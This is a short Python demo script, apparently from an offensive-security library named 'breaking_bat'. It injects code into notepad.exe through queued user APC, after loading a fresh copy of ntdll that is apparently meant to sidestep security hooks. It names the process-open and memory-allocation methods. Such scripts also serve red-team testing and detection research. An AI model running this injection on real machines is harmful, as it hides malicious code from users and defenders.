import breaking_bat
from breaking_bat import RemoteProcessOpenMethod, RemoteProcessMemoryMethod

print("Script: Inject via queue user APC")
print()

breaking_bat.init_sysapi(ntdll_load_copy=True)
breaking_bat.inject_queue_apc(
    "notepad.exe",
    open_method=RemoteProcessOpenMethod.OpenProcess,
    memory_method=RemoteProcessMemoryMethod.AllocateInAddr
)
